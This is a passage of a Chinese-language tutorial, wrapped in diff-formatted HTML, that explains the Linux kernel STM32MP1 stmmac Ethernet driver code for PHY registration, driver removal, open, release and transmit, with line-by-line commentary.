+<span class="token number">3</span>  <span class="token punctuation">{<!-- --></span>
+<span class="token number">4</span>      <span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>phy<span class="token punctuation">;</span>
+<span class="token number">5</span>      bool is_c45<span class="token punctuation">;</span>
+<span class="token number">6</span>      <span class="token keyword">int</span> rc<span class="token punctuation">;</span>
+<span class="token number">7</span>      u32 phy_id<span class="token punctuation">;</span>
+<span class="token number">8</span>
+<span class="token number">9</span>      is_c45 <span class="token operator">=</span> <span class="token function">of_device_is_compatible</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span>
+<span class="token number">10</span>                     <span class="token string">"ethernet-phy-ieee802.3-c45"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">11</span>
+<span class="token number">12</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>is_c45 <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">of_get_phy_id</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> <span class="token operator">&amp;</span>phy_id<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token number">13</span>         phy <span class="token operator">=</span> <span class="token function">phy_device_create</span><span class="token punctuation">(</span>mdio<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> phy_id<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">14</span>     <span class="token keyword">else</span>
+<span class="token number">15</span>         phy <span class="token operator">=</span> <span class="token function">get_phy_device</span><span class="token punctuation">(</span>mdio<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> is_c45<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">16</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">IS_ERR</span><span class="token punctuation">(</span>phy<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token number">17</span>         <span class="token keyword">return</span> <span class="token function">PTR_ERR</span><span class="token punctuation">(</span>phy<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">18</span>
+<span class="token number">19</span>     rc <span class="token operator">=</span> <span class="token function">of_irq_get</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">20</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>rc <span class="token operator">==</span> <span class="token operator">-</span>EPROBE_DEFER<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">21</span>         <span class="token function">phy_device_free</span><span class="token punctuation">(</span>phy<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">22</span>         <span class="token keyword">return</span> rc<span class="token punctuation">;</span>
+<span class="token number">23</span>     <span class="token punctuation">}</span>
+<span class="token number">24</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>rc <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">25</span>         phy<span class="token operator">-&gt;</span>irq <span class="token operator">=</span> rc<span class="token punctuation">;</span>
+<span class="token number">26</span>         mdio<span class="token operator">-&gt;</span>irq<span class="token punctuation">[</span>addr<span class="token punctuation">]</span> <span class="token operator">=</span> rc<span class="token punctuation">;</span>
+<span class="token number">27</span>     <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">28</span>         phy<span class="token operator">-&gt;</span>irq <span class="token operator">=</span> mdio<span class="token operator">-&gt;</span>irq<span class="token punctuation">[</span>addr<span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token number">29</span>     <span class="token punctuation">}</span>
+<span class="token number">30</span>
+<span class="token number">31</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">of_property_read_bool</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> <span class="token string">"broken-turn-around"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token number">32</span>         mdio<span class="token operator">-&gt;</span>phy_ignore_ta_mask <span class="token operator">|=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> addr<span class="token punctuation">;</span>
+<span class="token number">33</span>
+<span class="token number">34</span>     <span class="token function">of_property_read_u32</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> <span class="token string">"reset-assert-us"</span><span class="token punctuation">,</span>
+<span class="token number">35</span>             <span class="token operator">&amp;</span>phy<span class="token operator">-&gt;</span>mdio<span class="token punctuation">.</span>reset_assert_delay<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">36</span>     <span class="token function">of_property_read_u32</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> <span class="token string">"reset-deassert-us"</span><span class="token punctuation">,</span>
+<span class="token number">37</span>             <span class="token operator">&amp;</span>phy<span class="token operator">-&gt;</span>mdio<span class="token punctuation">.</span>reset_deassert_delay<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">38</span>
+<span class="token number">39</span>     <span class="token comment">/* Associate the OF node with the device structure so it
+40      * can be looked up later */</span>
+<span class="token number">41</span>     <span class="token function">of_node_get</span><span class="token punctuation">(</span>child<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">42</span>     phy<span class="token operator">-&gt;</span>mdio<span class="token punctuation">.</span>dev<span class="token punctuation">.</span>of_node <span class="token operator">=</span> child<span class="token punctuation">;</span>
+<span class="token number">43</span>     phy<span class="token operator">-&gt;</span>mdio<span class="token punctuation">.</span>dev<span class="token punctuation">.</span>fwnode <span class="token operator">=</span> <span class="token function">of_fwnode_handle</span><span class="token punctuation">(</span>child<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">44</span>
+<span class="token number">45</span>     <span class="token comment">/* All data is now stored in the phy struct;
+46      * register it */</span>
+<span class="token number">47</span>     rc <span class="token operator">=</span> <span class="token function">phy_device_register</span><span class="token punctuation">(</span>phy<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">48</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>rc<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">49</span>         <span class="token function">phy_device_free</span><span class="token punctuation">(</span>phy<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">50</span>         <span class="token function">of_node_put</span><span class="token punctuation">(</span>child<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">51</span>         <span class="token keyword">return</span> rc<span class="token punctuation">;</span>
+<span class="token number">52</span>     <span class="token punctuation">}</span>
+<span class="token number">53</span>
+<span class="token number">54</span>     <span class="token function">dev_dbg</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mdio<span class="token operator">-&gt;</span>dev<span class="token punctuation">,</span> <span class="token string">"registered phy %pOFn at address %i\n"</span><span class="token punctuation">,</span>
+<span class="token number">55</span>         child<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">56</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token number">57</span> <span class="token punctuation">}</span>
+</code></pre> 
+<p>第9行，使用函数of_device_is_compatible检查PHY节点的compatible属性是否为“ethernet-phy-ieee802.3-c45”，如果是的话要做其他的处理，这里没有设置此属性。</p> 
+<p>第15行，调用get_phy_device函数获取PHY设备，此函数里面会调用phy_device_create来创建一个phy_device设备并返回。</p> 
+<p>第19行，获取PHY芯片的中断信息，本章节并未用到。</p> 
+<p>第47行，调用phy_device_register函数向Linux内核注册PHY设备。</p> 
+<p>从上面的分析可以看出，<strong>向Linux内核注册MDIO总线的时候也会同时向Linux内核注册PHY设备</strong>，流程如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/d4/76/JNx0Dp9y_o.png" alt="MDIO总线注册流程"></p> 
+<p><strong>注册MDIO总线的时候会先从设备树中查找PHY设备，没有就会遍历所有的PHY设备，然后通过phy_device_register函数向内核注册PHY设备。</strong></p> 
+<h4><a id="stm32_dwmac_remove_1281"></a>stm32_dwmac_remove函数简析</h4> 
+<p><strong>卸载STM32MP1网络驱动的时候stm32_dwmac_remove函数就会执行</strong>，函数内容如下所示：</p> 
+<p><img src="https://images2.imgbox.com/96/24/V8tA1vpN_o.png" alt="stm32_dwmac_remove函数"></p> 
+<p>第428行调用了stmmac_dvr_remove函数进行卸载，此函数内容如下所示：</p> 
+<p><img src="https://images2.imgbox.com/dd/bb/sQCyQngR_o.png" alt="stmmac_dvr_remove函数"></p> 
+<p>第8行，调用stmmac_stop_all_dma函数结束所有的DMA。</p> 
+<p>第12行，调用unregister_netdev函数注销前面注册的net_device。</p> 
+<p>第24行，调用stmmac_mdio_unregister函数来移除掉MDIO总线相关的内容，此函数会调用mdiobus_unregister来注销掉mii_bus，并且通过函数mdiobus_free释放掉mii_bus。</p> 
+<p>第25行，释放工作队列。</p> 
+<h4><a id="stmmac_netdev_ops_1297"></a>stmmac_netdev_ops操作集</h4> 
+<p><strong>stmmac_dvr_probe函数设置了网卡驱动的net_dev_ops操作集为stmmac_netdev_ops</strong>，stmmac_netdev_ops内容如下：</p> 
+<p><img src="https://images2.imgbox.com/6d/87/rbkEYCLp_o.png" alt="stmmac_netdev_ops操作集"></p> 
+<p>1、stmmac_open函数简析</p> 
+<p><strong>打开一个网卡的时候stmmac_open函数就会执行</strong>，函数源码如下所示(限于篇幅原因，有省<br> 略)：</p> 
+<pre><code class="prism language-c">示例代码 <span class="token number">52.5</span><span class="token number">.3</span><span class="token number">.1</span> stmmac_open 函数
+<span class="token number">1</span>  <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">stmmac_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">net_device</span> <span class="token operator">*</span>dev<span class="token punctuation">)</span>
+<span class="token number">2</span>  <span class="token punctuation">{<!-- --></span>
+<span class="token number">3</span>      <span class="token keyword">struct</span> <span class="token class-name">stmmac_priv</span> <span class="token operator">*</span>priv <span class="token operator">=</span> <span class="token function">netdev_priv</span><span class="token punctuation">(</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">4</span>      <span class="token keyword">int</span> bfsize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token number">5</span>      u32 chan<span class="token punctuation">;</span>
+<span class="token number">6</span>      <span class="token keyword">int</span> ret<span class="token punctuation">;</span>
+<span class="token number">7</span>
+<span class="token number">8</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>priv<span class="token operator">-&gt;</span>hw<span class="token operator">-&gt;</span>pcs <span class="token operator">!=</span> STMMAC_PCS_RGMII <span class="token operator">&amp;&amp;</span>
+<span class="token number">9</span>          priv<span class="token operator">-&gt;</span>hw<span class="token operator">-&gt;</span>pcs <span class="token operator">!=</span> STMMAC_PCS_TBI <span class="token operator">&amp;&amp;</span>
+<span class="token number">10</span>         priv<span class="token operator">-&gt;</span>hw<span class="token operator">-&gt;</span>pcs <span class="token operator">!=</span> STMMAC_PCS_RTBI<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">11</span>         ret <span class="token operator">=</span> <span class="token function">stmmac_init_phy</span><span class="token punctuation">(</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">12</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">13</span>             <span class="token function">netdev_err</span><span class="token punctuation">(</span>priv<span class="token operator">-&gt;</span>dev<span class="token punctuation">,</span>
+<span class="token number">14</span>                 <span class="token string">"%s: Cannot attach to PHY (error: %d)\n"</span><span class="token punctuation">,</span>
+<span class="token number">15</span>                 <span class="token constant">__func__</span><span class="token punctuation">,</span> ret<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">16</span>             <span class="token keyword">return</span> ret<span class="token punctuation">;</span>
+<span class="token number">17</span>         <span class="token punctuation">}</span>
+<span class="token number">18</span>     <span class="token punctuation">}</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token number">36</span>     ret <span class="token operator">=</span> <span class="token function">alloc_dma_desc_resources</span><span class="token punctuation">(</span>priv<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">37</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>ret <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">38</span>         <span class="token function">netdev_err</span><span class="token punctuation">(</span>priv<span class="token operator">-&gt;</span>dev<span class="token punctuation">,</span> "<span class="token operator">%</span>s<span class="token operator">:</span> DMA descriptors allocation 
+failed\n"<span class="token punctuation">,</span>
+<span class="token number">39</span>             <span class="token constant">__func__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">40</span>         <span class="token keyword">goto</span> dma_desc_error<span class="token punctuation">;</span>
+<span class="token number">41</span>     <span class="token punctuation">}</span>
+<span class="token number">42</span>
+<span class="token number">43</span>     ret <span class="token operator">=</span> <span class="token function">init_dma_desc_rings</span><span class="token punctuation">(</span>dev<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">44</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>ret <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">45</span>         <span class="token function">netdev_err</span><span class="token punctuation">(</span>priv<span class="token operator">-&gt;</span>dev<span class="token punctuation">,</span> "<span class="token operator">%</span>s<span class="token operator">:</span> DMA descriptors initialization 
+failed\n"<span class="token punctuation">,</span>
+<span class="token number">46</span>             <span class="token constant">__func__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">47</span>         <span class="token keyword">goto</span> init_error<span class="token punctuation">;</span>
+<span class="token number">48</span>     <span class="token punctuation">}</span>
+<span class="token number">49</span>
+<span class="token number">50</span>     ret <span class="token operator">=</span> <span class="token function">stmmac_hw_setup</span><span class="token punctuation">(</span>dev<span class="token punctuation">,</span> true<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">51</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>ret <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">52</span>         <span class="token function">netdev_err</span><span class="token punctuation">(</span>priv<span class="token operator">-&gt;</span>dev<span class="token punctuation">,</span> <span class="token string">"%s: Hw setup failed\n"</span><span class="token punctuation">,</span> <span class="token constant">__func__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">53</span>         <span class="token keyword">goto</span> init_error<span class="token punctuation">;</span>
+<span class="token number">54</span>     <span class="token punctuation">}</span>
+<span class="token number">55</span>
+<span class="token number">56</span>     <span class="token function">stmmac_init_coalesce</span><span class="token punctuation">(</span>priv<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">57</span>
+<span class="token number">58</span>     <span class="token function">phylink_start</span><span class="token punctuation">(</span>priv<span class="token operator">-&gt;</span>phylink<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">59</span>
+<span class="token number">60</span>     <span class="token comment">/* Request the IRQ lines */</span>
+<span class="token number">61</span>     ret <span class="token operator">=</span> <span class="token function">request_irq</span><span class="token punctuation">(</span>dev<span class="token operator">-&gt;</span>irq<span class="token punctuation">,</span> stmmac_interrupt<span class="token punctuation">,</span>
+<span class="token number">62</span>             IRQF_SHARED<span class="token punctuation">,</span> dev<span class="token operator">-&gt;</span>name<span class="token punctuation">,</span> dev<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">63</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span>ret <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">64</span>         <span class="token function">netdev_err</span><span class="token punctuation">(</span>priv<span class="token operator">-&gt;</span>dev<span class="token punctuation">,</span>
+<span class="token number">65</span>             <span class="token string">"%s: ERROR: allocating the IRQ %d (error: %d)\n"</span><span class="token punctuation">,</span>
+<span class="token number">66</span>             <span class="token constant">__func__</span><span class="token punctuation">,</span> dev<span class="token operator">-&gt;</span>irq<span class="token punctuation">,</span> ret<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">67</span>         <span class="token keyword">goto</span> irq_error<span class="token punctuation">;</span>
+<span class="token number">68</span>     <span class="token punctuation">}</span>
+<span class="token number">69</span>
+<span class="token number">70</span>     <span class="token comment">/* Request the Wake IRQ in case of another line is used for WoL */</span>
+<span class="token number">71</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>priv<span class="token operator">-&gt;</span>wol_irq <span class="token operator">!=</span> dev<span class="token operator">-&gt;</span>irq<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">72</span>         ret <span class="token operator">=</span> <span class="token function">request_irq</span><span class="token punctuation">(</span>priv<span class="token operator">-&gt;</span>wol_irq<span class="token punctuation">,</span> stmmac_interrupt<span class="token punctuation">,</span>
+<span class="token number">73</span>             IRQF_SHARED<span class="token punctuation">,</span> dev<span class="token operator">-&gt;</span>name<span class="token punctuation">,</span> dev<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">74</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span>ret <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">75</span>             <span class="token function">netdev_err</span><span class="token punctuation">(</span>priv<span class="token operator">-&gt;</span>dev<span class="token punctuation">,</span>
+<span class="token number">76</span>                 <span class="token string">"%s: ERROR: allocating the WoL IRQ %d (%d)\n"</span><span class="token punctuation">,</span>
+<span class="token number">77</span>                 <span class="token constant">__func__</span><span class="token punctuation">,</span> priv<span class="token operator">-&gt;</span>wol_irq<span class="token punctuation">,</span> ret<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">78</span>             <span class="token keyword">goto</span> wolirq_error<span class="token punctuation">;</span>
+<span class="token number">79</span>         <span class="token punctuation">}</span>
+<span class="token number">80</span>     <span class="token punctuation">}</span>
+<span class="token number">81</span>
+<span class="token number">82</span>     <span class="token comment">/* Request the IRQ lines */</span>
+<span class="token number">83</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>priv<span class="token operator">-&gt;</span>lpi_irq <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">84</span>         ret <span class="token operator">=</span> <span class="token function">request_irq</span><span class="token punctuation">(</span>priv<span class="token operator">-&gt;</span>lpi_irq<span class="token punctuation">,</span> stmmac_interrupt<span class="token punctuation">,</span>
+IRQF_SHARED<span class="token punctuation">,</span>
+<span class="token number">85</span>                 dev<span class="token operator">-&gt;</span>name<span class="token punctuation">,</span> dev<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">86</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span>ret <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">87</span>             <span class="token function">netdev_err</span><span class="token punctuation">(</span>priv<span class="token operator">-&gt;</span>dev<span class="token punctuation">,</span>
+<span class="token number">88</span>                 <span class="token string">"%s: ERROR: allocating the LPI IRQ %d (%d)\n"</span><span class="token punctuation">,</span>
+<span class="token number">89</span>                 <span class="token constant">__func__</span><span class="token punctuation">,</span> priv<span class="token operator">-&gt;</span>lpi_irq<span class="token punctuation">,</span> ret<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">90</span>             <span class="token keyword">goto</span> lpiirq_error<span class="token punctuation">;</span>
+<span class="token number">91</span>         <span class="token punctuation">}</span>
+<span class="token number">92</span>     <span class="token punctuation">}</span>
+<span class="token number">93</span>
+<span class="token number">94</span>     <span class="token function">stmmac_enable_all_queues</span><span class="token punctuation">(</span>priv<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">95</span>     <span class="token function">stmmac_start_all_queues</span><span class="token punctuation">(</span>priv<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">96</span>
+<span class="token number">97</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token number">98</span> <span class="token punctuation">}</span>；
+</code></pre> 
+<p>第11行，看名字就知道了，初始化PHY设备。</p> 
+<p>第36行，分配DMA资源，分为TX和RX两个DMA资源。</p> 
+<p>第43行，初始化TX和RX DMA描述符，并且分配socket缓冲区。</p> 
+<p>第50行，设置mac为可用状态，配置mac核心寄存器，然后DMA数据准备接收和发送。</p> 
+<p>第58行，启动phylink。</p> 
+<p>第60-92行，申请中断，中断函数为stmmac_interrupt，重点，后面会解析。</p> 
+<p>第94-95行，使能队列和开启队列。</p> 
+<p>2、stmmac_release函数简析</p> 
+<p><strong>关闭网卡的时候stmmac_release函数就会执行</strong>，函数内容如下：</p> 
+<p><img src="https://images2.imgbox.com/11/93/Bn2EnGZc_o.png" alt="stmmac_release函数"></p> 
+<p>第10行，停止phylink。</p> 
+<p>第11行，断开phylink。</p> 
+<p>第13行，停止工作队列。</p> 
+<p>第15行，关闭工作队列。</p> 
+<p>第28行，停止TX/RX的DMA。</p> 
+<p>第31行，释放TX/RX DMA资源。</p> 
+<p>第34行，关闭MAC TX/RX。</p> 
+<p>第36行，关闭网络。</p> 
+<p>3、stmmac_xmit函数简析</p> 
+<p><strong>STM32MP1的网络数据发送是通过stmmac_xmit函数来完成，这个函数将上层传递过来的sk_buff中的数据通过DMA发送出去</strong>，函数源码如下所示(限于篇幅原因，有省略)：</p> 
+<pre><code class="prism language-c">示例代码 <span class="token number">52.5</span><span class="token number">.3</span><span class="token number">.3</span> stmmac_xmit 函数
+<span class="token number">1</span>  <span class="token keyword">static</span> <span class="token class-name">netdev_tx_t</span> <span class="token function">stmmac_xmit</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sk_buff</span> <span class="token operator">*</span>skb<span class="token punctuation">,</span>
+<span class="token keyword">struct</span> <span class="token class-name">net_device</span> <span class="token operator">*</span>dev<span class="token punctuation">)</span>
+<span class="token number">2</span>  <span class="token punctuation">{<!-- --></span>
+<span class="token number">3</span>      <span class="token keyword">struct</span> <span class="token class-name">stmmac_priv</span> <span class="token operator">*</span>priv <span class="token operator">=</span> <span class="token function">netdev_priv</span><span class="token punctuation">(</span>dev<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">4</span>      <span class="token keyword">unsigned</span> <span class="token keyword">int</span> nopaged_len <span class="token operator">=</span> <span class="token function">skb_headlen</span><span class="token punctuation">(</span>skb<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">5</span>      <span class="token keyword">int</span> i<span class="token punctuation">,</span> csum_insertion <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> is_jumbo <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token number">6</span>      u32 queue <span class="token operator">=</span> <span class="token function">skb_get_queue_mapping</span><span class="token punctuation">(</span>skb<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">7</span>      <span class="token keyword">int</span> nfrags <span class="token operator">=</span> <span class="token function">skb_shinfo</span><span class="token punctuation">(</span>skb<span class="token punctuation">)</span><span class="token operator">-&gt;</span>nr_frags<span class="token punctuation">;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token number">164</span>     <span class="token comment">/* Ready to fill the first descriptor and set the OWN bit w/o 
+165      * any problems because all the descriptors are actually ready 
+166      * to be passed to the DMA engine.
+167      */</span>
+<span class="token number">168</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">likely</span><span class="token punctuation">(</span><span class="token operator">!</span>is_jumbo<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">169</span>         bool last_segment <span class="token operator">=</span> <span class="token punctuation">(</span>nfrags <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">170</span>
+<span class="token number">171</span>     des <span class="token operator">=</span> <span class="token function">dma_map_single</span><span class="token punctuation">(</span>priv<span class="token operator">-&gt;</span>device<span class="token punctuation">,</span> skb<span class="token operator">-&gt;</span>data<span class="token punctuation">,</span>
+<span class="token number">172</span>                 nopaged_len<span class="token punctuation">,</span> DMA_TO_DEVICE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">173</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">dma_mapping_error</span><span class="token punctuation">(</span>priv<span class="token operator">-&gt;</span>device<span class="token punctuation">,</span> des<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token number">174</span>         <span class="token keyword">goto</span> dma_map_err<span class="token punctuation">;</span>
+<span class="token number">175</span>
+<span class="token number">176</span>     tx_q<span class="token operator">-&gt;</span>tx_skbuff_dma<span class="token punctuation">[</span>first_entry<span class="token punctuation">]</span><span class="token punctuation">.</span>buf <span class="token operator">=</span> des<span class="token punctuation">;</span>
+<span class="token number">177</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token number">190</span>     <span class="token comment">/* Prepare the first descriptor setting the OWN bit too */</span>
+<span class="token number">191</span>     <span class="token function">stmmac_prepare_tx_desc</span><span class="token punctuation">(</span>priv<span class="token punctuation">,</span> first<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> nopaged_len<span class="token punctuation">,</span>
+<span class="token number">192</span>         csum_insertion<span class="token punctuation">,</span> priv<span class="token operator">-&gt;</span>mode<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> last_segment<span class="token punctuation">,</span>
+<span class="token number">193</span>         skb<span class="token operator">-&gt;</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">194</span>     <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">195</span>         <span class="token function">stmmac_set_tx_owner</span><span class="token punctuation">(</span>priv<span class="token punctuation">,</span> first<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">196</span>     <span class="token punctuation">}</span>
+<span class="token number">197</span>
+<span class="token number">198</span>     <span class="token comment">/* The own bit must be the latest setting done when prepare the
+199      * descriptor and then barrier is needed to make sure that
+200      * all is coherent before granting the DMA engine.
+201      */</span>
+<span class="token number">202</span>     <span class="token function">wmb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">203</span>
+<span class="token number">204</span>     <span class="token function">netdev_tx_sent_queue</span><span class="token punctuation">(</span><span class="token function">netdev_get_tx_queue</span><span class="token punctuation">(</span>dev<span class="token punctuation">,</span> queue<span class="token punctuation">)</span><span class="token punctuation">,</span> skb<span class="token operator">-&gt;</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">205</span>
+<span class="token number">206</span>     <span class="token function">stmmac_enable_dma_transmission</span><span class="token punctuation">(</span>priv<span class="token punctuation">,</span> priv<span class="token operator">-&gt;</span>ioaddr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">207</span>
+<span class="token number">208</span>     tx_q<span class="token operator">-&gt;</span>tx_tail_addr <span class="token operator">=</span> tx_q<span class="token operator">-&gt;</span>dma_tx_phy <span class="token operator">+</span> <span class="token punctuation">(</span>tx_q<span class="token operator">-&gt;</span>cur_tx <span class="token operator">*</span>
+<span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token operator">*</span>desc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">209</span>     <span class="token function">stmmac_set_tx_tail_ptr</span><span class="token punctuation">(</span>priv<span class="token punctuation">,</span> priv<span class="token operator">-&gt;</span>ioaddr<span class="token punctuation">,</span> tx_q<span class="token operator">-&gt;</span>tx_tail_addr<span class="token punctuation">,</span>
+queue<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">210</span>     <span class="token function">stmmac_tx_timer_arm</span><span class="token punctuation">(</span>priv<span class="token punctuation">,</span> queue<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">211</span>
+<span class="token number">212</span>     <span class="token keyword">return</span> NETDEV_TX_OK<span class="token punctuation">;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token number">219</span> <span class="token punctuation">}</span>
+</code></pre> 
+<p>第171行，调用dma_map_single函数，进行DMA映射，返回值就是DMA映射后的虚拟地址。</p> 
+<p>第176行，保存DMA的虚拟地址，在stmmac_interrupt中断函数里使用。</p> 
+<p>第191行，调用stmmac_prepare_tx_desc函数，填充描述符其它信息，让DMA拥有该描述符。</p> 
